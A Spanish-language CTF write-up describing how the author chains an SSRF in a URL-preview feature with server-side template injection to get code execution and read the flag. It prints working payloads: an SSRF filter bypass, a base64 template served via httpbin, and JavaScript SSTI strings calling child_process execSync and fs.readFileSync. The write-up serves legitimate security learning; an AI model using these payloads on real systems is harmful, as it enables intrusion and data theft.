# Fireburned – Writeup

Empecé con el clásico recon. La web principal tiene un formulario que pide una URL y un botón "Preview render". Nada más. El código fuente no entrega mucho, pero sí veo que el `form` hace un GET al root con un parámetro `url`. Lo pruebo directo: `GET /?url=http://127.0.0.1`. No pasa nada. El backend ignora el parámetro. El formulario es solo decorativo.

Sigo con el flujo normal: lleno el campo con una URL pública, como `http://httpbin.org`, y aprieto "Preview render". La app dispara una petición interna. Intercepto el tráfico con Burp y veo que el frontend hace un `POST /api/fetch` con un JSON que incluye la URL. El servidor la consume y devuelve el body de la respuesta upstream. Clásico SSRF.

Pruebo con `127.0.0.1:8080` y me devuelve `{"error":"host_blocked"}`. Lo mismo con `10.0.0.1`. El filtro bloquea IPs privadas por string. Pero si uso el nombre del servicio interno, como `fireburned--db:8080`, pasa. Accedo al servicio interno. Confirmo con `/health`: `{"status":"ok","store":"emberhook-cards"}`. El backend es un Express que parsea JSON — si mando un body malformado, responde con `SyntaxError`.

Tengo SSRF, pero necesito un upstream que devuelva un JSON con `fields.template.stringValue`, porque el endpoint `/api/preview` lo usa para renderizar. Intento fuzzear rutas en `fireburned--db:8080`. Pruebo todo: `/cards`, `/draft`, `/v1`, `/api/cards`, `/emberhook-cards`, incluso rutas de Firestore como `/v1/projects/x/databases/(default)/documents`. Nada. Solo `/health` responde. El servicio se cae cada dos minutos. Muchos timeouts. Imposible hacer un fuzzing serio con `wfuzz` o `ffuf`. Me quedo estancado.

Cambio de enfoque. El enunciado dice que la app usa webhooks para recuperar borradores. Tal vez no necesito encontrar la ruta interna. Tal vez el flujo real es que el servidor fetchea desde un endpoint externo. Si eso es así, puedo controlar el upstream.

Voy a ver qué headers manda el servidor al hacer el fetch. Uso `httpbin.org/headers` como URL. En la respuesta, veo el `User-Agent: emberhook-preview/1.0`. Interesante. El nombre `emberhook` coincide con el `store: "emberhook-cards"` del health check. No es casualidad.

Ahora, si el servidor acepta cualquier URL externa y parsea el JSON que devuelve, puedo hacer que un servicio público me devuelva un JSON con `fields.template.stringValue` controlado. Uso `httpbin.org/base64/...` para inyectar un template. Codifico este payload en base64:

```json
{"fields":{"template":{"stringValue":"{{7*7}}"}}}
```

Envío:
```
POST /api/fetch
{"url":"http://httpbin.org/base64/eyAiZmllbGRzIjogeyAidGVtcGxhdGUiOiB7ICJzdHJpbmdWYWx1ZSI6ICJ7ezcqN319IiB9IH0gfQ=="}
```

Luego, tomo ese mismo JSON y lo paso por `/api/preview`. El resultado es `SSSTI-49`. El `49` confirma que se evaluó la expresión. SSTI activo.

Sigo probando para identificar el motor. `{{constructor.constructor('return 7*7')()}}` devuelve `49`. Es JavaScript puro. No es Jinja, no es Handlebars. Es un evaluador que usa `Function` por dentro. RCE inminente.

Armo el payload para ejecutar comandos:

```json
{
  "fields": {
    "template": {
      "stringValue": "{{constructor.constructor('return require(\"child_process\").execSync(\"id\").toString()')()}}"
    }
  }
}
```

Lo paso por `/api/fetch` a través de `httpbin/base64`, luego por `/api/preview`. Respuesta: `uid=1000(node) gid=1000(node) groups=1000(node)`. RCE confirmada.

Busco el flag. Reviso variables de entorno: `process.env.FLAG_PATH` apunta a `/flag.txt`. Leo el archivo:

```js
{{constructor.constructor('return require("fs").readFileSync("/flag.txt","utf8")')()}}
```

Resultado:
```
flag{ember_ssrf_ssti_burn}
```